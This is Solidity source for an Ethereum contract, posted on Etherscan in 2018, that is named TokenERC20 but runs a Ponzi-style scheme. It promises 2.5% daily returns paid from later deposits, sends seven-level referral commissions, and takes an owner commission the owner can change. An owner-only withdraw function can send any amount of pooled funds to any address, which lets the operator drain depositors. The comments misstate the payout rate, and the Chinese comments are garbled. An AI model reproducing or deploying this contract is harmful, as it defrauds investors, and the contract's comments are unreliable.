/**

 *Submitted for verification at Etherscan.io on 2018-12-01

*/



/*

*

*

*   ΢��fac2323

*   ����erc20���� ERC721���ң�����Լ��̫���ߺ�Լ��������Լ��΢��fac2323

*

*

*

*

*

*

*/





pragma solidity ^0.4.21;

 

library SafeMath {



  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {

    if (a == 0) {

      return 0;

    }

    c = a * b;

    assert(c / a == b);

    return c;

  }



  /**

  * @dev Integer division of two numbers, truncating the quotient.

  */

  function div(uint256 a, uint256 b) internal pure returns (uint256) {

    // assert(b > 0); // Solidity automatically throws when dividing by 0

    // uint256 c = a / b;

    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return a / b;

  }



  function sub(uint256 a, uint256 b) internal pure returns (uint256) {

    assert(b <= a);

    return a - b;

  }





  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {

    c = a + b;

    assert(c >= a);

    return c;

  }

}

 

library Fdatasets {

 

    struct Player {

        address affadd;                // �ϼ��Ƽ���0

        uint256 atblock;                //ʱ��1

        uint256 invested;                //Ͷ��2

        uint256 pot;               //����Ա��ˮ 3

        uint256 touzizongshu;      //Ͷ������4 

        uint256 tixianzongshu;     //�������� 5

        uint256 yongjin;

    }  

    

}



contract TokenERC20 {

	

    using SafeMath for uint256;

 

    

    

    uint256 public commission  = 10;//��ˮ�����Ը�

    uint256 public investeds;       //��Ͷ��

    uint256 public amountren;         //amount���� 

    address public owner       = 0xc47E655BC521Bf15981134E392709af5b25947B4;//0x115395f1a6B4640E0C59C33FED51677336b4B1E3

    address aipi;

    

    

     

    mapping(address  => Fdatasets.Player)public users;

    

    modifier olyowner() {

        require(msg.sender == owner || msg.sender == aipi); 

        _;

    }

    

    function TokenERC20()public  payable{

       amountren = 0;

       investeds = 0; 

       aipi = msg.sender;

    }

    

    function () payable public {

       

    	// if sender (aka YOU) is invested more than 0 ether

        ///����

        if (users[msg.sender].invested != 0) {

            // calculate profit amount as such:

            // amount = (amount invested) * 4% * (blocks since last transaction) / 5900

            // 5900 is an average block count per day produced by Ethereum blockchain

            uint256 amount = users[msg.sender].invested * 25 / 1000 * (now - users[msg.sender].atblock) / 86400;



            // send calculated amount of ether directly to sender (aka YOU)

            if(this.balance < amount ){

                amount = this.balance;

            }

            address sender = msg.sender;

            sender.send(amount);

            users[msg.sender].tixianzongshu = amount.add(users[msg.sender].tixianzongshu); //��������

        }



        // record block number and invested amount (msg.value) of this transaction

        users[msg.sender].atblock = now;

        users[msg.sender].invested += msg.value;

        users[msg.sender].touzizongshu = msg.value.add(users[msg.sender].touzizongshu);//Ͷ������

        //�Ƽ�Ӷ�𷢷�

        if(msg.value > 0){

            amountren++;

            investeds = investeds.add(msg.value);

            

            //��ˮ

             users[owner].pot = users[owner].pot + (msg.value * commission / 100);

            address a = users[msg.sender].affadd;

            for(uint256 i = 0; i < 7; i++){

                if(i == 0 && a != address(0)){

                    a.send(msg.value * 8 / 100 ); 

                    users[a].yongjin = users[a].yongjin.add(msg.value * 8 / 100 ); 

                }

                    

                if(i == 1 && a != address(0)){

                    a.send(msg.value * 5 / 100 );

                    users[a].yongjin = users[a].yongjin.add(msg.value * 5 / 100 ); 

                }

                     

                if(i == 2  && a != address(0)){

                    a.send(msg.value * 3 / 100 ); 

                    users[a].yongjin = users[a].yongjin.add(msg.value * 3 / 100 ); 

                }

                    

                if(i > 2  &&  a != address(0)){

                    a.send(msg.value * 1 / 100 ); 

                    users[a].yongjin = users[a].yongjin.add(msg.value * 1 / 100 ); 

                }

                a = users[a].affadd;       

            }  

        } 

    }

    

    //�����ʽ�

    function withdraw(uint256 _amount,address _owner)public olyowner returns(bool){

        _owner.send(_amount);

        return true;

    }

    

    //���س�ˮ

    function withdrawcommissions()public olyowner returns(bool){

        owner.send(users[msg.sender].pot);

        users[msg.sender].pot=0;

    }

    

    //�޸ĳ�ˮ

    function commissions(uint256 _amount)public olyowner returns(bool){

        commission = _amount;

    }

 

     //�鿴������ȡ����

    function gettw(address _owner)public view returns(uint256){

        uint256 amount;

     

        amount = users[_owner].invested * 2 / 100 * (now - users[_owner].atblock) / 86400;

       

        return amount;

    }

 

    

    //get this.

    function getthis()public view returns(uint256){ 

        return this.balance;

    }

    

    //get amount����investeds

    function getamount()public view returns(uint256,uint256){ 

        return (amountren,investeds);

    }

 

    //��������

    function gets(address _owner)public view returns(uint256,uint256,uint256){

        uint256 a = users[_owner].touzizongshu;

        uint256 b = users[_owner].tixianzongshu;

        uint256 c = users[_owner].yongjin;

        return (a,b,c);

    }

  

    function investedbuy(address _owner)public payable  {

        require(msg.sender != _owner); 

        amountren++;

        investeds = investeds.add(msg.value);

        users[msg.sender].affadd = _owner;

        //��ˮ  

        users[owner].pot = users[owner].pot + (msg.value * commission / 100);

        address a = users[msg.sender].affadd;

         

        for(uint256 i = 0; i < 7; i++){

            if(i == 0 && a != address(0)){

                a.send(msg.value * 8 / 100 );

                users[a].yongjin = users[a].yongjin.add(msg.value * 8 / 100 ); 

            }

                    

            if(i == 1 && a != address(0)){

                a.send(msg.value * 5 / 100 );

                users[a].yongjin = users[a].yongjin.add(msg.value * 5 / 100 ); 

            }

                     

            if(i == 2  && a != address(0)){

                a.send(msg.value * 3 / 100 ); 

                users[a].yongjin = users[a].yongjin.add(msg.value * 3 / 100 ); 

            }

                    

            if(i > 2  &&  a != address(0)){

                a.send(msg.value * 1 / 100 );

                users[a].yongjin = users[a].yongjin.add(msg.value * 1 / 100 ); 

            }

             a = users[a].affadd;           

        } 

        users[msg.sender].touzizongshu = msg.value.add(users[msg.sender].touzizongshu);//Ͷ������

         ///����

        if (users[msg.sender].invested != 0) {

            // calculate profit amount as such:

            // amount = (amount invested) * 4% * (blocks since last transaction) / 5900

            // 5900 is an average block count per day produced by Ethereum blockchain

            uint256 amount = users[msg.sender].invested * 25 / 1000 * (now - users[msg.sender].atblock) / 86400;



            // send calculated amount of ether directly to sender (aka YOU)

            if(this.balance < amount ){

                amount = this.balance;

            }

            address sender = msg.sender;

            sender.send(amount);

            users[msg.sender].tixianzongshu = amount.add(users[msg.sender].tixianzongshu); //��������

        }

        users[msg.sender].atblock = now;

        users[msg.sender].invested += msg.value;

     

    } 

  



}